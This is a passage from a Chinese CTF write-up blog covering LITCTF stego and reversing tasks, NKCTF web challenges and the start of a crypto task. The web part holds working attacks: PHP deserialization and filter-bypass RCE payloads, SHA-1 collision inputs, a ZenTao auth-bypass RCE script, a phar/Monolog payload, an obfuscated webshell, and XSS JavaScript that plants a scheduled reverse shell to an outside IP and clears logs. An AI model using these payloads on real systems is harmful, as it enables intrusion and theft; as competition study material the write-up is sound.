<p>这题队友做的，放个脚本学习一下</p>
<p>附件是个图片</p>
<p><img src="http://img.hzy2003628.top/202207240951366.png" alt="image-20220724095128176"></p>
<pre><code class="hljs plaintext">from PIL import Image
img = Image.open(&#x27;FlashyColors.png&#x27;)
size = w, h = img.size
data = img.load()
flag = &#x27;&#x27;
for x in range(120,w,240):
    for y in range(120,h,240):
        color = data[x,y][:3]
        for c in color:
            if c == 0:
                flag += &#x27;0&#x27;
            else:
                flag += &#x27;1&#x27;
print(flag) //000001001100010010010101010001000011010101000100011001111011001100000100110101000111010111110100100101011111011011000011000001110110011001010101111101110100011010000011001101110011001100110101111101100110011011000110000100110101011010000111100101011111011000110011000001101100011011110111001001111101</code></pre>
<p>binary to char</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import long_to_bytes
s=&quot;000001001100010010010101010001000011010101000100011001111011001100000100110101000111010111110100100101011111011011000011000001110110011001010101111101110100011010000011001101110011001100110101111101100110011011000110000100110101011010000111100101011111011000110011000001101100011011110111001001111101&quot;
print(long_to_bytes(int(s,2)))</code></pre>
<p><img src="http://img.hzy2003628.top/202207240953263.png" alt="image-20220724095354177"></p>
<pre><code class="hljs plaintext">LITCTF&#123;0MG_I_l0ve_th3s3_fla5hy_c0lor&#125;</code></pre>
<h1 id="rev">rev</h1>
<h2 id="math-test">math test</h2>
<blockquote>
<p>this math test is hard</p>
</blockquote>
<p>64位文件，main函数分析<br>
<img src="http://img.hzy2003628.top/202207252055164.png" alt="image-20220725205532088"></p>
<p>跟进NUM_Q，发现是循环十次</p>
<p><img src="http://img.hzy2003628.top/202207252056439.png" alt="image-20220725205609383"></p>
<pre><code class="hljs plaintext">__isoc99_scanf(&quot;%llu&quot;, &amp;submitted[i]);
//  输入函数</code></pre>
<p>跟进grade_test()</p>
<p><img src="http://img.hzy2003628.top/202207252057967.png" alt="image-20220725205724889"></p>
<p>此处的for循环时是对输入的答案进行校验看是否正确</p>
<p>正确就会输出flag</p>
<p>继续跟进generate_flag()</p>
<p><img src="http://img.hzy2003628.top/202207252058602.png" alt="image-20220725205831528"></p>
<pre><code class="hljs plaintext">for ( k = 0; k &lt; FLAG_LEN; ++k )
  printf(&quot;%c&quot;, flag[k]);  
   // flag输出，跟进FLAG_LEN</code></pre>
<p>得到问题答案</p>
<p><img src="http://img.hzy2003628.top/202207252059322.png" alt="image-20220725205958263"></p>
<p>这道题最直接的办法就是直接运行文件输入正确的答案得到flag</p>
<p>直接运行math这个文件是没有权限的，需要赋予777权限</p>
<pre><code class="hljs plaintext">chmod 777 math
./math</code></pre>
<p><img src="http://img.hzy2003628.top/202207252101826.png" alt="image-20220725210152746"></p>
<p>LITCTF{y0u_must_b3_gr8_@_m4th_i_th0ught_th4t_t3st_was_imp0ss1bl3!}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF</title>
    <url>/2023/03/27/NKCTF/</url>
    <content><![CDATA[<p>NKCTF</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>这个比赛就写了WEB还有一个密码，其他是队友写的，WEB还是比较简单的，AK了，记录一下解题的思路和过程吧</p>
<h1 id="web">WEB</h1>
<h2 id="baby_php">baby_php</h2>
<ul>
<li>PHP反序列化POP链构造</li>
<li>命令执行绕过</li>
</ul>
<p>源码如下</p>
<pre><code class="hljs plaintext">&lt;?php
    error_reporting(0);
    class Welcome&#123;
        public $name;
        public $arg = &#x27;oww!man!!&#x27;;
        public function __construct()&#123;
            $this-&gt;name = &#x27;ItS SO CREAZY&#x27;;
        &#125;
        public function __destruct()&#123;
            if($this-&gt;name == &#x27;welcome_to_NKCTF&#x27;)&#123;
                echo $this-&gt;arg;
            &#125;
        &#125;
    &#125;

    function waf($string)&#123;
        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $string))&#123;
            die(&quot;you are bad&quot;);
        &#125;
    &#125;
    class Happy&#123;
        public $shell;
        public $cmd;
        public function __invoke()&#123;
            $shell = $this-&gt;shell;
            $cmd = $this-&gt;cmd;
            waf($cmd);
            eval($shell($cmd));
        &#125;
    &#125;
    class Hell0&#123;
        public $func;
        public function __toString()&#123;
            $function = $this-&gt;func;
            $function();
        &#125;
    &#125;

    if(isset($_GET[&#x27;p&#x27;]))&#123;
        unserialize($_GET[&#x27;p&#x27;]);
    &#125;else&#123;
        highlight_file(__FILE__);
    &#125;
?&gt;</code></pre>
<p>首先是构造POP链子，很简单就不多说了，exp如下</p>
<pre><code class="hljs plaintext">&lt;?php
    class Welcome&#123;
        public $name;
        public $arg;
    &#125;
    class Happy&#123;
        public $shell;
        public $cmd;
    &#125;
    class Hell0&#123;
        public $func;
    &#125;

$h=new Welcome();
$z=new Happy();
$y=new Hell0();

$h-&gt;name=&#x27;welcome_to_NKCTF&#x27;;
$h-&gt;arg=$y;
$y-&gt;func=$z;
$z-&gt;shell=&#x27;system&#x27;;
$z-&gt;cmd=&#x27;dir&#x27;;
echo serialize($h);
?&gt;</code></pre>
<p>最主要的是在那个waf的一个绕过，很显然他是过滤了单个字符，更细节，同时也过滤了常见的俩个通配符，一般情况下对于更细节的通配符是不了解的，这个时候可能就会很迷茫，不知道该如何绕过，去网上查一下Linux的通配符，临时学习补充一下</p>
<p>这里构造的exp主要是用到了一个范围性的通配符和取反绕过</p>
<pre><code class="hljs plaintext">&lt;?php
    class Welcome&#123;
        public $name;
        public $arg;
    &#125;
    class Happy&#123;
        public $shell;
        public $cmd;
    &#125;
    class Hell0&#123;
        public $func;
    &#125;

$h=new Welcome();
$z=new Happy();
$y=new Hell0();

$h-&gt;name=&#x27;welcome_to_NKCTF&#x27;;
$h-&gt;arg=$y;
$y-&gt;func=$z;
$z-&gt;shell=&#x27;system&#x27;;
$z-&gt;cmd=&#x27;more /[b-z]1[^b-z][b-z]&#x27;;
echo serialize($h);
?&gt;
//O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:23:&quot;more /[b-z]1[^b-z][b-z]&quot;;&#125;&#125;&#125;
</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325151256430.png?x-oss-process=hzy" alt="image-20230325151256430"></p>
<p>NKCTF{43bf9a8b-7b95-440e-9fd4-886461dd9de2}</p>
<p>参考博客</p>
<p><a href="https://blog.csdn.net/solaraceboy/article/details/79254778">(103条消息) Linux通配符的使用详解_晨曦蜗牛的博客-CSDN博客</a></p>
<h2 id="eazy_php">eazy_php</h2>
<ul>
<li>命令执行绕过</li>
</ul>
<p>源码如下</p>
<pre><code class="hljs plaintext">&lt;?php 
    highlight_file(__FILE__);
    error_reporting(0);
    if($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))&#123;
        if((string)$_POST[&#x27;c&#x27;] != (string)$_POST[&#x27;d&#x27;] &amp;&amp; sha1($_POST[&#x27;c&#x27;]) === sha1($_POST[&#x27;d&#x27;]))&#123;
            if($_GET[&#x27;e&#x27;] != 114514 &amp;&amp; intval($_GET[&#x27;e&#x27;]) == 114514)&#123;
                if(isset($_GET[&#x27;NS_CTF.go&#x27;]))&#123;
                    if(isset($_POST[&#x27;cmd&#x27;]))&#123;
                        if(!preg_match(&#x27;/[0-9a-zA-Z]/i&#x27;, $_POST[&#x27;cmd&#x27;]))&#123;
                            eval($_POST[&#x27;cmd&#x27;]);
                        &#125;else&#123;
                            die(&#x27;error!!!!!!&#x27;);
                        &#125;
                    &#125;else&#123;
                        die(&#x27;error!!!!!&#x27;);
                    &#125;
                &#125;else&#123;
                    die(&#x27;error!!!!&#x27;);
                &#125;
            &#125;else&#123;
                die(&#x27;error!!!&#x27;);
            &#125;
        &#125;else&#123;
            die(&#x27;error!!&#x27;);
        &#125;
    &#125;else&#123;
        die(&#x27;error!&#x27;);
    &#125;
?&gt; error!</code></pre>
<p>先是一个md5弱比较绕过，然后sha1比较，然后整数类型比较然后就是无参rce，可以用或运算直接绕过从而执行命令，exp如下</p>
<pre><code class="hljs plaintext">POST /?a[]=1&amp;b[]=2&amp;NS[CTF.go=iii&amp;e=114514.1 HTTP/1.1
Host: c089cd6d-0fcc-448e-badb-d161d19e8df2.node2.yuzhian.com.cn
Content-Length: 1401
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://c089cd6d-0fcc-448e-badb-d161d19e8df2.node2.yuzhian.com.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://c089cd6d-0fcc-448e-badb-d161d19e8df2.node2.yuzhian.com.cn/?a[]=1&amp;b[]=2&amp;NS_CTF.go=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8
Connection: close

cmd=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%0c%01%07&quot;^&quot;%60%60%60%20%2f%60%60%60%60&quot;);
&amp;c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325155327288.png?x-oss-process=hzy" alt="image-20230325155327288"></p>
<p>NKCTF{95a32e57-d9b9-4d9a-8069-56e3fb81d836}</p>
<h2 id="hard_php">hard_php</h2>
<ul>
<li>命令执行绕过</li>
</ul>
<p>源码如下</p>
<pre><code class="hljs plaintext">&lt;?php
// not only ++
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST[&#x27;NKCTF&#x27;])) &#123;
    $NK = $_POST[&#x27;NKCTF&#x27;];
    if (is_string($NK)) &#123;
        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;
            eval($NK);
        &#125;else&#123;
            echo(&quot;hacker!!!&quot;);
        &#125;
    &#125;else&#123;
        phpinfo();
    &#125;
&#125;
?&gt;</code></pre>
<p>自增绕过，需要进行一次url编码</p>
<pre><code class="hljs plaintext">$_=(_/_._)[_];$__=++$_;$___=++$_;++$_;++$_;$____=++$_;$_=++$_;$_=_.$___.$__.$____.$_;$$_[_]($$_[__]);</code></pre>
<pre><code class="hljs plaintext">NKCTF=%24_%3D(_%2F_._)%5B_%5D%3B%24__%3D%2B%2B%24_%3B%24___%3D%2B%2B%24_%3B%2B%2B%24_%3B%2B%2B%24_%3B%24____%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D_.%24___.%24__.%24____.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B&amp;_=highlight_file&amp;__=/flag</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325160938330.png?x-oss-process=hzy" alt="image-20230325160938330"></p>
<p>得到flag</p>
<p>NKCTF{581b748f-45ff-40fc-8e3f-e5bebfbf3fe3}</p>
<h2 id="easy_pms">easy_pms</h2>
<ul>
<li>CVE魔改</li>
</ul>
<p>这道题目本身是禅道系统2023年爆出的0day漏洞，但是做了一定的魔改</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325232201139.png?x-oss-process=hzy" alt="image-20230325232201139"></p>
<p>这里就直接粘链接了，前面一部分直接复现即可</p>
<p><a href="https://blog.csdn.net/qq_41904294/article/details/128838423">(103条消息) 禅道项目管理系统RCE漏洞复现+利用_禅道漏洞_OidBoy_G的博客-CSDN博客</a></p>
<p>然后使用脚本是可以确定存在这个漏洞的</p>
<pre><code class="hljs plaintext"># -*- coding: UTF-8 -*-
# !/usr/bin/python
 
&#x27;&#x27;&#x27;
权限绕过+RCE POC 伪静态传参版
禅道系统 影响版本 安全版本
开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2
旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2
企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2
&#x27;&#x27;&#x27;
import requests
 
proxies = &#123;
    #&quot;http&quot;: &quot;127.0.0.1:8080&quot;,
    #&quot;https&quot;: &quot;127.0.0.1:8080&quot;,
&#125;
def check(url):
    url1 = url+&#x27;/misc-captcha-user.html&#x27;
    # url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参
    # url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接
    url3 = url + &#x27;repo-create.html&#x27;
    url4 = url + &#x27;repo-edit-10000-10000.html&#x27;
    headers=&#123;
        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,
        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,
        &quot;Cookie&quot;:&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;,
    &#125;
 
    headers2 = &#123;
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,
        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
        &quot;Cookie&quot;: &quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;,
        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,
        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,
        &quot;Referer&quot;:url+&quot;/repo-edit-1-0.html&quot;
    &#125;
 
    data1 = &#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;
    data2 = &#x27;SCM=Subversion&amp;client=`id`&#x27;
    s=requests.session()
    try:
        req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)
        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers2)
        req4 = s.post(url4,data=data2,proxies=proxies,timeout=5,verify=False,headers=headers2)
        print(req4.text)
        if &#x27;uid=&#x27; in req4.text:
            print(url,&quot;&quot;)
            return True
    except Exception as e:
        print(e)
    return False
if __name__ == &#x27;__main__&#x27;:
    print(check(&quot;http://a20c5aaa-5390-4240-8973-65dcea1be633.node2.yuzhian.com.cn/&quot;))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325232436594.png?x-oss-process=hzy" alt="image-20230325232436594"></p>
<p>但是当继续进一步操作的时候，发现无法实现dns外带，以及反弹shell，多半是不出网了，后面这个就有点脑洞了，因为他这命令执行不能正常返回全部内容，而只是显示前面一部分，所以没办法准确判断flag的位置甚至是flag的名字也不知道</p>
<p>后面这个全靠猜了，直接通配符一级一级目录往前cat，为了防止cat被过滤了，我直接用的tac，然后就蒙对了，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325232730149.png?x-oss-process=hzy" alt="image-20230325232730149"></p>
<p>NKCTF{02dfb3f1-476a-4a60-9154-4975d034cadd}</p>
<h2 id="webpagetest">webpagetest</h2>
<pre><code class="hljs plaintext">POST /runtest.php HTTP/1.1
Host: 8e2199d8-3496-4279-ba6c-538df1103c49.node2.yuzhian.com.cn
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.51
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nkctf.yuzhian.com.cn:8000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.1.195834996.1678963920; _ga_KCSGQQ51ER=GS1.1.1679757334.12.0.1679757478.0.0.0; o=5bc2f02e27b4df970d058a6d6e5dbec4cb501beb; tzo=480
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 892

rkey=&#123;&#123;r1&#125;&#125;&amp;ini=%3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0A%95%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00_%01%00%00O%3A32%3A%22Monolog%5CHandler%5CSyslogUdpHandler%22%3A1%3A%7Bs%3A6%3A%22socket%22%3BO%3A29%3A%22Monolog%5CHandler%5CBufferHandler%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3Br%3A2%3Bs%3A13%3A%22%00%2A%00bufferSize%22%3Bi%3A-1%3Bs%3A9%3A%22%00%2A%00buffer%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22cat%20%2F%2A%22%3Bs%3A5%3A%22level%22%3BN%3B%7D%7Ds%3A8%3A%22%00%2A%00level%22%3BN%3Bs%3A14%3A%22%00%2A%00initialized%22%3Bb%3A1%3Bs%3A14%3A%22%00%2A%00bufferLimit%22%3Bi%3A-1%3Bs%3A13%3A%22%00%2A%00processors%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22current%22%3Bi%3A1%3Bs%3A6%3A%22system%22%3B%7D%7D%7D%08%00%00%00test.txt%04%00%00%00pzjc%04%00%00%00%0C~%7F%D8%B4%01%00%00%00%00%00%00test%C9D%3B%3F%5C%B2%3C%F3%EB%5E%E9L%BBS%FF%2CB4%CC%D8%02%00%00%00GBMB
</code></pre>
<pre><code class="hljs plaintext">POST /runtest.php HTTP/1.1
Host: 8e2199d8-3496-4279-ba6c-538df1103c49.node2.yuzhian.com.cn
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.51
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nkctf.yuzhian.com.cn:8000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.1.195834996.1678963920; _ga_KCSGQQ51ER=GS1.1.1679757334.12.0.1679757478.0.0.0; o=5bc2f02e27b4df970d058a6d6e5dbec4cb501beb; tzo=480
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 892

rkey=rkey=phar:///var/www/html/results/&#123;&#123;r1&#125;&#125;./testinfo.ini/foo&amp;ini=%3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0A%95%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00_%01%00%00O%3A32%3A%22Monolog%5CHandler%5CSyslogUdpHandler%22%3A1%3A%7Bs%3A6%3A%22socket%22%3BO%3A29%3A%22Monolog%5CHandler%5CBufferHandler%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3Br%3A2%3Bs%3A13%3A%22%00%2A%00bufferSize%22%3Bi%3A-1%3Bs%3A9%3A%22%00%2A%00buffer%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22cat%20%2F%2A%22%3Bs%3A5%3A%22level%22%3BN%3B%7D%7Ds%3A8%3A%22%00%2A%00level%22%3BN%3Bs%3A14%3A%22%00%2A%00initialized%22%3Bb%3A1%3Bs%3A14%3A%22%00%2A%00bufferLimit%22%3Bi%3A-1%3Bs%3A13%3A%22%00%2A%00processors%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22current%22%3Bi%3A1%3Bs%3A6%3A%22system%22%3B%7D%7D%7D%08%00%00%00test.txt%04%00%00%00pzjc%04%00%00%00%0C~%7F%D8%B4%01%00%00%00%00%00%00test%C9D%3B%3F%5C%B2%3C%F3%EB%5E%E9L%BBS%FF%2CB4%CC%D8%02%00%00%00GBMB</code></pre>
<h2 id="easy_cms">easy_cms</h2>
<blockquote>
<p>一个内容管理系统</p>
</blockquote>
<ul>
<li>文件上传</li>
<li>SQL注入</li>
</ul>
<p>织梦cms</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326120040378.png?x-oss-process=hzy" alt="image-20230326120040378"></p>
<p>后台弱口令admin/admin，先开启会员</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326120203197.png?x-oss-process=hzy" alt="image-20230326120203197"></p>
<p>[php_code_audit_project/dedecms v5.7 sp2 <a href="http://xn--mnq932av8vh4r.md">代码审计.md</a> at master · SukaraLin/php_code_audit_project (<a href="http://github.com">github.com</a>)](<a href="https://github.com/SukaraLin/php_code_audit_project/blob/master/dedecms/dedecms">https://github.com/SukaraLin/php_code_audit_project/blob/master/dedecms/dedecms</a> v5.7 sp2 <a href="http://xn--mnq932av8vh4r.md">代码审计.md</a>)</p>
<p>这个路径/dede/file_manage_control.php存在上传点，只不过有waf需要去绕过【文件式管理器】</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326135610158.png?x-oss-process=hzy" alt="image-20230326135610158"></p>
<p>需要做个小免杀</p>
<pre><code class="hljs plaintext">&lt;?php
var_dump(&quot;awdqa&quot;);
$pi=(is_nan^(6).(4)).(tan^(1).(5));
$pi=$$pi;
$pi&#123;0&#125;($pi&#123;1&#125;)
?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326162343685.png?x-oss-process=hzy" alt="image-20230326162343685"></p>
<p>然后上传成功，即可rce</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326162418420.png?x-oss-process=hzy" alt="image-20230326162418420"></p>
<p>NKCTF{43f9af2a-0a04-4de6-a59b-602ee355f4fd}</p>
<p>参考链接</p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com)</a></p>
<h2 id="xiaopi">xiaopi</h2>
<ul>
<li>phpstudy RCE</li>
<li>无curl的XSS反弹shell</li>
</ul>
<p>放入X-Requested-With：XMLHttpRequest请求头就能进入登陆界面</p>
<p>然后就是小皮RCE，因为不知道绝对路径所以思路是反弹shell</p>
<p>在vps构造恶意文件，写计划任务</p>
<pre><code class="hljs plaintext">function exp() &#123;
    $.ajax(&#123;
        url: &#x27;/service/app/tasks.php?type=task_list&#x27;,   //获取计划任务列表
        type: &#x27;GET&#x27;,
        headers:&#123;
            &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;
        &#125;,
        dataType: &#x27;json&#x27;,
        success: function (data) &#123;
            var id = data.data[0].ID;    //任务名称
            $.ajax(&#123;
                url: &#x27;/service/app/tasks.php?type=exec_task&#x27;,     //执行计划任务
                type: &#x27;POST&#x27;,
                headers:&#123;
                    &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
                    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;
                &#125;,
                data: &#123; tid: id &#125;,
                dataType: &#x27;json&#x27;,
                success: function (res) &#123;
                    $.ajax(&#123;
                        url: &#x27;/service/app/log.php?type=clearlog&#x27;,
                        type: &#x27;POST&#x27;,
                        data: &#123; type: &#x27;clearlog&#x27; &#125;,
                        dataType: &#x27;json&#x27;,
                        success: function (res2) &#123;&#125;
                    &#125;);
                &#125;
            &#125;);
        &#125;
    &#125;);
&#125;

function save() &#123;
    var data = new Object();
    data.task_id = &#x27;&#x27;;
    data.title = &#x27;shell_title&#x27;;
    data.exec_cycle = &#x27;5&#x27;;
    data.week = &#x27;1&#x27;;
    data.day = &#x27;3&#x27;;
    data.hour = &#x27;1&#x27;;
    data.minute = &#x27;1&#x27;;
    data.shell = &#x27;sh -i &gt;&amp; /dev/tcp/43.143.195.203/7788 0&gt;&amp;1&#x27;;    //要执行的命令
    $.ajax(&#123;
        url: &#x27;/service/app/tasks.php?type=save_shell&#x27;,
        type: &#x27;POST&#x27;,
        headers:&#123;
            &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;
        &#125;,
        data: data,
        dataType: &#x27;json&#x27;,
        success: function (res) &#123;
            exp();
        &#125;
    &#125;);
&#125;

save();</code></pre>
<p>开启http临时serer</p>
<p>用户名插入恶意脚本</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326135444498.png?x-oss-process=hzy" alt="image-20230326135444498"></p>
<p>然后监听端口等待反弹得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230326135237767.png?x-oss-process=hzy" alt="image-20230326135237767"></p>
<p>NKCTF{d6ab1362-adb8-4152-8fb7-9ab7ca2eb56e}</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="ez_polynomial">ez_polynomial</h2>
<p>源码如下</p>
<pre><code class="hljs plaintext">#sage
from Crypto.Util.number import *
flag = list(bytearray(&#x27;&#x27;))
p = getPrime(16)
R.&lt;y&gt; = PolynomialRing(GF(p))
while True:
    P1 = R.random_element(degree=(ZZ.random_element(len(flag), 2*len(flag))))
    Q1 = R.random_element(degree=(ZZ.random_element(len(flag), 2*len(flag))))
    if P1.is_irreducible() and Q1.is_irreducible():
        P = P1
        Q = Q1
        break
e = 65537
N = P*Q
S.&lt;x&gt; = R.quotient(N)
c = S(flag) ^ e
print(&quot;P:&quot; + str(p) + &quot;\n&quot;)
print(&quot;N:&quot; + str(N) + &quot;\n&quot;)
print(&quot;C:&quot; + str(c))

#P:40031
